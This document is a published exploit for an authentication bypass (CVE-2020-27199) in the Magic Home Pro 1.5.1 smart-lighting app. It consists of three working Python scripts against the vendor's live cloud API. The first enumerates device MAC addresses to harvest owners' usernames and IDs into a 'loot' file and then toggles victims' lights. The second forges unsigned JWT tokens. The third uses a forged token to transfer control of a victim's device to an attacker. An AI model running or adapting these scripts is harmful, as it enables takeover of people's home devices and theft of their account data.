# Exploit Title: Magic Home Pro 1.5.1 - Authentication Bypass
# Google Dork: NA
# Date: 22 October 2020
# Exploit Author: Victor Hanna (Trustwave SpiderLabs)
# Author Github Page: https://9lyph.github.io/CVE-2020-27199/
# Vendor Homepage: http://www.zengge.com/appkzd
# Software Link: https://play.google.com/store/apps/details?id=com.zengge.wifi&hl=en
# Version: 1.5.1 (REQUIRED)
# Tested on: Android 10

## Enumeration ##

import requests
import json
import os
from colorama import init
from colorama import Fore, Back, Style
import re

'''
1. First Stage Authentication
2. Second Stage Enumerate
3. Third Stage Remote Execute
'''

global found_macaddresses
found_macaddresses = []
global outtahere
outtahere = ""
q = "q"
global token


def turnOn(target, token):

    urlOn = "https://wifij01us.magichue.net/app/sendCommandBatch/ZG001"
    array = {
        "dataCommandItems":[
            {"hexData":"71230fa3","macAddress":target}
        ]
    }
    data = json.dumps(array)
    headersOn = {
        "User-Agent":"Magic Home/1.5.1(ANDROID,9,en-US)",
        "Accept-Language": "en-US",
        "Accept": "application/json",
        "Content-Type": "application/json; charset=utf-8",
        "token":token,
        "Host": "wifij01us.magichue.net",
        "Connection": "close",
        "Accept-Encoding": "gzip, deflate"
    }
    print (Fore.WHITE + "[+] Sending Payload ...")
    response = requests.post(urlOn, data=data, headers=headersOn)
    if response.status_code == 200:
        if "true" in response.text:
            print (Fore.GREEN + "[*] Endpoint " + Style.RESET_ALL + f"{target}" + Fore.GREEN + " Switched On")
        else:
            print (Fore.RED + "[-] Failed to switch on Endpoint " + Style.RESET_ALL + f"{target}")

def turnOff(target, token):

    urlOff = "https://wifij01us.magichue.net/app/sendCommandBatch/ZG001"
    array = {
        "dataCommandItems":[
            {"hexData":"71240fa4","macAddress":target}
        ]
    }
    data = json.dumps(array)
    headersOff = {
        "User-Agent":"Magic Home/1.5.1(ANDROID,9,en-US)",
        "Accept-Language": "en-US",
        "Accept": "application/json",
        "Content-Type": "application/json; charset=utf-8",
        "token":token,
        "Host": "wifij01us.magichue.net",
        "Connection": "close",
        "Accept-Encoding": "gzip, deflate"
    }
    print (Fore.WHITE + "[+] Sending Payload ...")
    response = requests.post(urlOff, data=data, headers=headersOff)
    if response.status_code == 200:
        if "true" in response.text:
            print (Fore.GREEN + "[*] Endpoint " + Style.RESET_ALL + f"{target}" + Fore.GREEN + " Switched Off")
        else:
            print (Fore.RED + "[-] Failed to switch on Endpoint " + Style.RESET_ALL + f"{target}")

def lighItUp(target, token):

    outtahere = ""
    q = "q"
    if len(str(target)) < 12:
        print (Fore.RED + "[!] Invalid target" + Style.RESET_ALL)
    elif re.match('[0-9a-f]{2}[0-9a-f]{2}[0-9a-f]{2}[0-9a-f]{2}[0-9a-f]{2}[0-9a-f]{2}$', target.lower()):
        while outtahere.lower() != q.lower():
            if outtahere == "0":
                turnOn(target, token)
            elif outtahere == "1":
                turnOff(target, token)
            outtahere = input(Fore.BLUE + "ON/OFF/QUIT ? (0/1/Q): " + Style.RESET_ALL)

def Main():
    urlAuth = "https://wifij01us.magichue.net/app/login/ZG001"

    data = {
        "userID":"<Valid Registered Email/Username>",
        "password":"<Valid Registered Password>",
        "clientID":""
    }

    headersAuth = {
        "User-Agent":"Magic Home/1.5.1(ANDROID,9,en-US)",
        "Accept-Language": "en-US",
        "Accept": "application/json",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "wifij01us.magichue.net",
        "Connection": "close",
        "Accept-Encoding": "gzip, deflate"
    }

    # First Stage Authenticate

    os.system('clear')
    print (Fore.WHITE + "[+] Authenticating ...")
    response = requests.post(urlAuth, json=data, headers=headersAuth)
    resJsonAuth = response.json()
    token = (resJsonAuth['token'])

    # Second Stage Enumerate

    print (Fore.WHITE + "[+] Enumerating ...")
    macbase = "C82E475DCE"
    macaddress = []
    a = ["%02d" % x for x in range(100)]
    for num in a:
        macaddress.append(macbase+num)

    with open('loot.txt', 'w') as f:
        for mac in macaddress:
            urlEnum = "https://wifij01us.magichue.net/app/getBindedUserListByMacAddress/ZG001"
            params = {
                "macAddress":mac
            }

            headersEnum = {
                "User-Agent": "Magic Home/1.5.1(ANDROID,9,en-US)",
                "Accept-Language": "en-US",
                "Content-Type": "application/json; charset=utf-8",
                "Accept": "application/json",
                "token": token,
                "Host": "wifij01us.magichue.net",
                "Connection": "close",
                "Accept-Encoding": "gzip, deflate"
            }

            response = requests.get(urlEnum, params=params, headers=headersEnum)
            resJsonEnum = response.json()
            data = (resJsonEnum['data'])
            if not data:
                pass
            elif data:
                found_macaddresses.append(mac)
                print (Fore.GREEN + "[*] MAC Address Identified: " + Style.RESET_ALL + f"{mac}" + Fore.GREEN + f", User: " + Style.RESET_ALL + f"{(data[0]['userName'])}, " + Fore.GREEN + "Unique ID: " + Style.RESET_ALL + f"{data[0]['userUniID']}, " + Fore.GREEN + "Binded ID: " + Style.RESET_ALL + f"{data[0]['bindedUniID']}")
                f.write(Fore.GREEN + "[*] MAC Address Identified: " + Style.RESET_ALL + f"{mac}" + Fore.GREEN + f", User: " + Style.RESET_ALL + f"{(data[0]['userName'])}, " + Fore.GREEN + "Unique ID: " + Style.RESET_ALL + f"{data[0]['userUniID']}, " + Fore.GREEN + "Binded ID: " + Style.RESET_ALL + f"{data[0]['bindedUniID']}\n")
            else:
                print (Fore.RED + "[-] No results found!")
                print(Style.RESET_ALL)

        if not found_macaddresses:
            print (Fore.RED + "[-] No MAC addresses retrieved")
        elif found_macaddresses:
            attackboolean = input(Fore.BLUE + "Would you like to Light It Up ? (y/N): " + Style.RESET_ALL)
            if (attackboolean.upper() == 'Y'):
                target = input(Fore.RED + "Enter a target device mac address: " + Style.RESET_ALL)
                lighItUp(target, token)
            elif (attackboolean.upper() == 'N'):
                print (Fore.CYAN + "Sometimes, belief isn’t about what we can see. It’s about what we can’t."+ Style.RESET_ALL)
            else:
                print (Fore.CYAN + "The human eye is a wonderful device. With a little effort, it can fail to see even the most glaring injustice." + Style.RESET_ALL)

if __name__ == "__main__":
    Main()

## Token Forging ##

#!/usr/local/bin/python3

import url64
import requests
import json
import sys
import os
from colorama import init
from colorama import Fore, Back, Style
import re
import time
from wsgiref.handlers import format_date_time
from datetime import datetime
from time import mktime

now = datetime.now()
stamp = mktime(now.timetuple())

'''
HTTP/1.1 200
Server: nginx/1.10.3
Content-Type: application/json;charset=UTF-8
Connection: close

"{\"code\":0,\"msg\":\"\",\"data\":{\"webApi\":\"wifij01us.magichue.net/app\",\"webPathOta\":\"http:\/\/wifij01us.magichue.net\/app\/ota\/download\",\"tcpServerController\":\"TCP,8816,ra8816us02.magichue.net\",\"tcpServerBulb\":\"TCP,8815,ra8815us02.magichue.net\",\"tcpServerControllerOld\":\"TCP,8806,mhc8806us.magichue.net\",\"tcpServerBulbOld\":\"TCP,8805,mhb8805us.magichue.net\",\"sslMqttServer\":\"ssl:\/\/192.168.0.112:1883\",\"serverName\":\"Global\",\"serverCode\":\"US\",\"userName\":\"\",\"userEmail\":\"\",\"userUniID\":\"\"},\"token\":\"\"}"
'''

def Usage():
    print (f"Usage: {sys.argv[0]} <username> <unique id>")

def Main(user, uniqid):
    os.system('clear')
    print ("[+] Encoding ...")
    print ("[+] Bypass header created!")
    print ("HTTP/1.1 200")
    print ("Server: nginx/1.10.3")
    print ("Date: "+str(format_date_time(stamp))+"")
    print ("Content-Type: application/json;charset=UTF-8")
    print ("Connection: close\r\n\r\n")

    jwt_header = '{"typ": "JsonWebToken","alg": "None"}'
    jwt_data = '{"userID": "'+user+'", "uniID": "'+uniqid+'","cdpid": "ZG001","clientID": "","serverCode": "US","expireDate": 1618264850608,"refreshDate": 1613080850608,"loginDate": 1602712850608}'
    jwt_headerEncoded = url64.encode(jwt_header.strip())
    jwt_dataEncoded = url64.encode(jwt_data.strip())
    jwtcombined = (jwt_headerEncoded.strip()+"."+jwt_dataEncoded.strip()+".")
    print ("{\"code\":0,\"msg\":\"\",\"data\":{\"webApi\":\"wifij01us.magichue.net/app\",\"webPathOta\":\"http://wifij01us.magichue.net/app/ota/download\",\"tcpServerController\":\"TCP,8816,ra8816us02.magichue.net\",\"tcpServerBulb\":\"TCP,8815,ra8815us02.magichue.net\",\"tcpServerControllerOld\":\"TCP,8806,mhc8806us.magichue.net\",\"tcpServerBulbOld\":\"TCP,8805,mhb8805us.magichue.net\",\"sslMqttServer\":\"ssl:\/\/192.168.0.112:1883\",\"serverName\":\"Global\",\"serverCode\":\"US\",\"userName\":\""+user+"\",\"userEmail\":\""+user+"\",\"userUniID\":\""+uniqid+"\"},\"token\":\""+jwtcombined+"\"}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        Usage()
    else:
        Main(sys.argv[1], sys.argv[2])

## Device Takeover PoC ##

#!/usr/local/bin/python3

import url64
import requests
import json
import sys
import os
from colorama import init
from colorama import Fore, Back, Style
import re

def Usage():
    print (f"Usage: {sys.argv[0]} <attacker email> <target email> <target mac address> <target forged token>")

def Main():

    attacker_email = sys.argv[1]
    target_email = sys.argv[2]
    target_mac = sys.argv[3]
    forged_token = sys.argv[4]

    os.system('clear')
    print (Fore.WHITE + "[+] Sending Payload ...")
    url = "https://wifij01us.magichue.net/app/shareDevice/ZG001"

    array = {"friendUserID":attacker_email, "macAddress":target_mac}

    data = json.dumps(array)

    headers = {
        "User-Agent":"Magic Home/1.5.1(ANDROID,9,en-US)",
        "Accept-Language": "en-US",
        "Accept": "application/json",
        "Content-Type": "application/json; charset=utf-8",
        "token":forged_token,
        "Host": "wifij01us.magichue.net",
        "Connection": "close",
        "Accept-Encoding": "gzip, deflate"
    }

    response = requests.post(url, data=data, headers=headers)
    if response.status_code == 200:
        if "true" in response.text:
            print (Fore.GREEN + "[*] Target is now yours ... " + Style.RESET_ALL)
        else:
            print (Fore.RED + "[-] Failed to take over target !" + Style.RESET_ALL)

if __name__ == "__main__":
    if len(sys.argv) < 5:
        Usage()
    else:
        Main()